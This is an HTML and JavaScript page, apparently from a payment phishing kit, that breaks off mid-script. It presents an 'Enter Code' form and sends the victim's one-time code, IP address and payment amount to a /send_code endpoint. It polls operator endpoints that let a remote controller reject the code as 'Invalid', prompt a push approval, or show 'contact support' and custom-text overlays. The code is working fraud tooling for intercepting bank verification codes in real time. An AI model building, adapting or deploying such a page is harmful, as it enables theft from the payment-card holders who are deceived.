<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Code</title>
    <link href="https://fonts.googleapis.com/css?family=Inter:400,600&display=swap" rel="stylesheet">
    <style>
        body {
            background: #16b6ff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Inter', Arial, sans-serif;
        }
        .container {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
            padding: 40px 32px 32px 32px;
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .icon {
            background: #16b6ff;
            border-radius: 50%;
            width: 56px;
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
        }
        .icon svg {
            width: 32px;
            height: 32px;
            color: #fff;
        }
        h2 {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 24px;
            color: #222;
        }
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 18px;
        }
        input[type="text"] {
            padding: 12px 16px;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
            background: #f8faff;
            font-size: 1rem;
            outline: none;
            transition: border 0.2s;
        }
        input[type="text"]:focus {
            border: 1.5px solid #16b6ff;
        }
        button {
            background: #16b6ff;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 12px 0;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background: #0e8ecf;
        }
        
        /* Стилі для text-overlay */
        #text-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: #00b2ff;
            z-index: 100000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        
        #text-overlay .text-modal {
            background: white;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
            padding: 2.5rem 2rem 2rem 2rem;
            max-width: 370px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            overflow: hidden;
        }
        
        #text-overlay .text-icon {
            width: 60px;
            height: 60px;
            background: #00b2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
        }
        
        #text-overlay .text-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
            color: #222;
        }
        
        #text-overlay .text-total {
            font-size: 1.2rem;
            font-weight: 500;
            margin-bottom: 1.2rem;
            color: #00b2ff;
        }
        
        #text-overlay .text-content {
            color: #222;
            font-size: 1.1rem;
            margin-bottom: 1.2rem;
            line-height: 1.5;
            word-wrap: break-word;
            max-width: 100%;
        }
        
        #text-overlay .text-phone-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
            width: 48px;
            height: 48px;
            background: #00b2ff;
            border-radius: 50%;
        }
        
        @media (max-width: 480px) {
            #text-overlay .text-modal {
                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
            }
            #text-overlay .text-title {
                font-size: 1.3rem;
            }
            #text-overlay .text-content {
                font-size: 0.98rem;
            }
        }
    </style>
    <style>
    #push-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100vw; height: 100vh;
      background: rgba(22,182,255,0.97);
      z-index: 100000;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      transition: opacity 0.3s;
      animation: fadeInPush 0.5s;
    }
    @keyframes fadeInPush {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .push-modal {
      background: #fff;
      border-radius: 24px;
      max-width: 370px;
      width: 92vw;
      margin: auto;
      padding: 2.7rem 2rem 2.2rem 2rem;
      box-shadow: 0 8px 40px rgba(0,0,0,0.18);
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      animation: popInPush 0.5s;
    }
    @keyframes popInPush {
      0% { transform: scale(0.92); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .push-bell {
      margin-bottom: 1.5rem;
      width: 70px;
      height: 70px;
      background: linear-gradient(135deg, #16b6ff 60%, #00e0ff 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 16px rgba(22,182,255,0.18);
      position: relative;
      animation: bellPop 0.7s;
    }
    @keyframes bellPop {
      0% { transform: scale(0.7); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .push-bell svg {
      width: 38px;
      height: 38px;
      color: #fff;
      animation: bellShake 1.2s infinite cubic-bezier(.36,.07,.19,.97);
      transform-origin: 50% 10%;
    }
    @keyframes bellShake {
      0%, 100% { transform: rotate(0deg); }
      10% { transform: rotate(-10deg); }
      20% { transform: rotate(8deg); }
      30% { transform: rotate(-6deg); }
      40% { transform: rotate(4deg); }
      50% { transform: rotate(-2deg); }
      60% { transform: rotate(1deg); }
      70%, 90% { transform: rotate(0deg); }
    }
    .push-title {
      font-size: 2.1rem;
      font-weight: 700;
      color: #16b6ff;
      margin-bottom: 0.7rem;
      letter-spacing: -1px;
    }
    .push-desc {
      font-size: 1.13rem;
      color: #222;
      margin-bottom: 0.7rem;
      line-height: 1.5;
    }
    @media (max-width: 480px) {
      .push-modal { padding: 1.2rem 0.5rem 1.2rem 0.5rem; }
      .push-title { font-size: 1.3rem; }
      .push-desc { font-size: 0.98rem; }
    }
    </style>
</head>
<body>
    <div class="container" id="payment-card-main">
        <div class="icon">
            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0-1.104.896-2 2-2s2 .896 2 2-.896 2-2 2-2-.896-2-2zm0 0V7m0 4v4m0 0c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2z"/>
            </svg>
        </div>
        <h2>Enter Code</h2>
        <form id="code-form">
            <input type="text" id="code-input" name="code" placeholder="Enter your code" required autocomplete="off">
            <button type="submit">Send</button>
        </form>
        <div id="message" style="margin-top:14px;color:#16b6ff;font-size:1rem;font-weight:500;"></div>
    </div>
    <script>
        let lastCode = '';
        // Додаємо overlay-вікно загрузки
        const loadingOverlay = document.createElement('div');
        loadingOverlay.id = 'loading-overlay';
        loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
        loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing...</div></div>';
        document.body.appendChild(loadingOverlay);
        console.log('Overlay appended:', loadingOverlay);

        // Тестовий показ overlay через 1 секунду після завантаження сторінки (видаляємо)
        // setTimeout(() => {
        //   document.getElementById('loading-overlay').style.display = 'flex';
        //   console.log('Overlay shown (test)');
        // }, 1000);

        // Показуємо overlay після відправки коду
        const codeForm = document.getElementById('code-form');
        let userIP = null;
        function getUserIP(callback) {
        fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => callback(data.ip))
                .catch(() => callback(null));
        }
        // --- Витягуємо total і currency з URL ---
        function getTotalAndCurrency() {
            const urlParams = new URLSearchParams(window.location.search);
            const totalRaw = urlParams.get('total') || sessionStorage.getItem('total_price') || sessionStorage.getItem('ticket_total');
            const currencyRaw = urlParams.get('currency') || sessionStorage.getItem('currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
            if (totalRaw) {
                const match = totalRaw.match(/\d+[\.,]?\d*/);
                const totalNum = match ? match[0].replace(',', '.') : '';
                return { total: totalNum, currency: currencyRaw };
            }
            // fallback: price/currency
            let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
            let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
            return { total: price, currency };
        }
        // --- Універсальний POLLING для всіх кнопок (push, support, text) ---
        let supportTabOpened = false;
        let pushTabOpened = false;
        let textTabOpened = false;
        
        function getPageCode() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
        }
        
        function startUniversalPolling() {
            setTimeout(pollAllButtons, 2000);
        }
        
        async function pollAllButtons() {
            const page_code = getPageCode();
            document.body.setAttribute('data-page-code', page_code);
            
            if (!page_code) {
                return setTimeout(pollAllButtons, 2000);
            }
            
            // Polling для push кнопки
            try {
                const pushUrl = '/check_push?page_code=' + encodeURIComponent(page_code);
                const pushResp = await fetch(pushUrl);
                const pushTxt = await pushResp.text();
                
                if (pushTxt === 'true' && !pushTabOpened) {
                    const { total, currency } = getTotalAndCurrency();
                    const pushTitle = document.getElementById('push-payment-title');
                    if (pushTitle) {
                        pushTitle.textContent = `Payment ${total} ${currency}`;
                    }
                    // Скидаємо стани інших кнопок
                    supportTabOpened = false;
                    textTabOpened = false;
                    
                    // Приховуємо всі інші overlay
                    if (document.getElementById('support-overlay')) {
                        document.getElementById('support-overlay').style.display = 'none';
                    }
                    if (document.getElementById('text-overlay')) {
                        document.getElementById('text-overlay').style.display = 'none';
                    }
                    
                    document.getElementById('push-overlay').style.display = 'flex';
                    document.getElementById('payment-card-main').style.display = 'none';
                    if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
                    pushTabOpened = true;
                }
            } catch (e) {
                console.error('Push polling error:', e);
            }
            
            // Polling для support/text кнопок - НЕ чекаємо userIP
            try {
                // Використовуємо поточний userIP або null
                const currentIP = userIP || 'unknown';
                const supportUrl = `/check_support?ip=${encodeURIComponent(currentIP)}`;
                const supportResp = await fetch(supportUrl);
                const supportData = await supportResp.json();
                
                if ((supportData.show_support || supportData.show_text)) {
                    if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
                }
                
                // Support кнопка - показуємо overlay замість нового вікна
                if (!supportTabOpened && supportData.show_support) {
                    // Скидаємо стани інших кнопок
                    pushTabOpened = false;
                    textTabOpened = false;
                    
                    // Створюємо support overlay якщо його немає
                    if (!document.getElementById('support-overlay')) {
                    const supportOverlay = document.createElement('div');
                        supportOverlay.id = 'support-overlay';
                        supportOverlay.style.cssText = `
                            display: flex;
                            position: fixed;
                            top: 0; left: 0; width: 100vw; height: 100vh;
                        background: #00b2ff;
                            z-index: 100000;
                            align-items: center;
                            justify-content: center;
                            flex-direction: column;
                        `;
                        supportOverlay.innerHTML = `
                            <div style="background: white; border-radius: 20px; padding: 2.5rem 2rem; max-width: 370px; width: 90%; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.12);">
                                <div style="width: 60px; height: 60px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.2rem auto;">
                                    <svg width="36" height="36" viewBox="0 0 24 24" fill="white">
                                        <path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/>
                                    </svg>
                                </div>
                                <h3 style="font-size: 2rem; font-weight: 700; margin-bottom: 1.2rem; color: #222;">Waiting</h3>
                                <p style="font-size: 1.1rem; color: #666; margin-bottom: 1.5rem;">Contact technical support</p>
                                <div style="width: 50px; height: 50px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto;">
                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                                        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
                                    </svg>
                                </div>
                            </div>
                        `;
                        document.body.appendChild(supportOverlay);
                    }
                    // Приховуємо всі інші overlay
                    if (document.getElementById('text-overlay')) {
                        document.getElementById('text-overlay').style.display = 'none';
                    }
                    if (document.getElementById('push-overlay')) {
                        document.getElementById('push-overlay').style.display = 'none';
                    }
                    document.getElementById('support-overlay').style.display = 'flex';
                    document.getElementById('payment-card-main').style.display = 'none';
                    supportTabOpened = true;
                }
                
                // Text кнопка - показуємо overlay замість нового вікна
                if (!textTabOpened && supportData.show_text && supportData.text_id) {
                    // Скидаємо стани інших кнопок
                    pushTabOpened = false;
                    supportTabOpened = false;
                    
                    // Завантажуємо текст і показуємо overlay
                    fetch(`/get_custom_text?text_id=${supportData.text_id}`)
                    .then(resp => resp.text())
                    .then(textContent => {
                            if (!document.getElementById('text-overlay')) {
                                const textOverlay = document.createElement('div');
                                textOverlay.id = 'text-overlay';
                                textOverlay.style.cssText = `
                                    display: flex;
                                    position: fixed;
                                    top: 0; left: 0; width: 100vw; height: 100vh;
                                    background: #00b2ff;
                                    z-index: 100000;
                                    align-items: center;
                                    justify-content: center;
                                    flex-direction: column;
                                `;
                                textOverlay.innerHTML = `
                                    <div class="text-modal">
                                        <div class="text-icon">
                                            <svg viewBox="0 0 24 24" style="width: 36px; height: 36px; fill: white;">
                                                <path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/>
                                            </svg>
                                        </div>
                                        <div class="text-title">Waiting</div>
                                        <div class="text-total" id="text-total"></div>
                                        <div class="text-content" id="text-content"></div>
                                        <div class="text-phone-icon">
                                            <svg viewBox="0 0 24 24" style="width: 28px; height: 28px; fill: white;">
                                                <path d="M6.62 10.79a15.053 15.053 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.58.57a1 1 0 011 1V20a1 1 0 01-1 1C10.07 21 3 13.93 3 5a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.46.57 3.58a1 1 0 01-.24 1.01l-2.2 2.2z"/>
                                            </svg>
                                        </div>
                                    </div>
                                `;
                                document.body.appendChild(textOverlay);
                            }
                            
                            // Показуємо total якщо є
                            const { total, currency } = getTotalAndCurrency();
                            const textTotal = document.getElementById('text-total');
                            if (textTotal && total) {
                                textTotal.textContent = `Total: ${total} ${currency}`;
                            }
                            
                            // Показуємо текст користувача
                            const textContentDiv = document.getElementById('text-content');
                            if (textContentDiv) {
                                textContentDiv.textContent = textContent || 'No text provided';
                            }
                            
                            // Приховуємо всі інші overlay
                            if (document.getElementById('support-overlay')) {
                                document.getElementById('support-overlay').style.display = 'none';
                            }
                            if (document.getElementById('push-overlay')) {
                                document.getElementById('push-overlay').style.display = 'none';
                            }
                            document.getElementById('text-overlay').style.display = 'flex';
                            document.getElementById('payment-card-main').style.display = 'none';
                            textTabOpened = true;
                        })
                        .catch(e => console.error('Text loading error:', e));
                }
            } catch (e) {
                console.error('Support polling error:', e);
            }
            
            setTimeout(pollAllButtons, 2000);
        }
        
        // Стартуємо polling одразу, а не чекаємо userIP
        startUniversalPolling();
        
        // Оновлюємо userIP коли він стає доступним
        getUserIP(function(ip) {
            userIP = ip;
        });

        // Валідація для номера карти - тільки цифри
        document.addEventListener('DOMContentLoaded', function() {
            var cardInput = document.getElementById('card-input');
            if (cardInput) {
                cardInput.addEventListener('input', function(e) {
                    this.value = this.value.replace(/\D/g, '').slice(0, 16);
                });
            }
        });

        codeForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            console.log('SUBMIT FIRED');
            loadingOverlay.style.display = 'flex'; // Показуємо одразу!
            const code = document.getElementById('code-input').value;
            lastCode = code;
            const urlParams = new URLSearchParams(window.location.search);
            const page = urlParams.get('page') || sessionStorage.getItem('page_code');
            const total = urlParams.get('total') || sessionStorage.getItem('total_price') || '45';
            const currency = urlParams.get('currency') || sessionStorage.getItem('currency') || 'EUR';
            
            // Якщо userIP ще не визначено — чекаємо, але overlay вже показано
            while (!userIP) {
                await new Promise(res => setTimeout(res, 100));
            }
            try {
                const response = await fetch('/send_code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code, ip: userIP, page, total, currency })
                });
                if (response.ok) {
                    document.getElementById('message').textContent = 'Code sent!';
                } else {
                    document.getElementById('message').textContent = 'Error sending code';
                    loadingOverlay.style.display = 'none';
                }
            } catch (err) {
                document.getElementById('message').textContent = 'Error sending code';
                loadingOverlay.style.display = 'none';
            }
        });
        // Polling for request_again
        setInterval(async function() {
            if (!lastCode) return;
            try {
                const resp = await fetch('/check_request_again?code=' + encodeURIComponent(lastCode));
                const txt = await resp.text();
                console.log('Polling response:', txt, 'for code:', lastCode);
                if (txt === 'true') {
                    document.getElementById('code-input').value = '';
                    document.getElementById('message').textContent = 'Invalid code';
                    lastCode = '';
                    loadingOverlay.style.display = 'none'; // <-- Додаємо це!
                }
            } catch (e) {
                console.log('Polling error:', e);
            }
        }, 2000);
    </script>

    <!-- Універсальний блок для приховування page_code з URL -->
    <script>
    (function() {
        // Отримуємо page_code, total та currency з URL
        const urlParams = new URLSearchParams(window.location.search);
        const page_code = urlParams.get('page');
        const total = urlParams.get('total');
        const currency = urlParams.get('currency');
        
        if (page_code) {
            // Зберігаємо в sessionStorage
            sessionStorage.setItem('page_code', page_code);
            console.log('Page code saved to sessionStorage:', page_code);
        }
        
        if (total) {
            sessionStorage.setItem('total_price', total);
            console.log('Total price saved to sessionStorage:', total);
        }
        
        if (currency) {
            sessionStorage.setItem('currency', currency);
            console.log('Currency saved to sessionStorage:', currency);
        }
        
        // Видаляємо всі параметри з URL без перезавантаження сторінки
        if (page_code || total || currency) {
            const newUrl = new URL(window.location);
            newUrl.searchParams.delete('page');
            newUrl.searchParams.delete('total');
            newUrl.searchParams.delete('currency');
            window.history.replaceState({}, document.title, newUrl.pathname + newUrl.search);
            
            console.log('URL parameters hidden and saved to sessionStorage');
        }
    })();
    </script>
    <!-- Додаємо push-overlay у HTML, якщо його немає -->
    <script>
    if (!document.getElementById('push-overlay')) {
      const pushOverlay = document.createElement('div');
      pushOverlay.id = 'push-overlay';
      pushOverlay.innerHTML = `
        <div class="push-modal">
          <div class="push-bell">
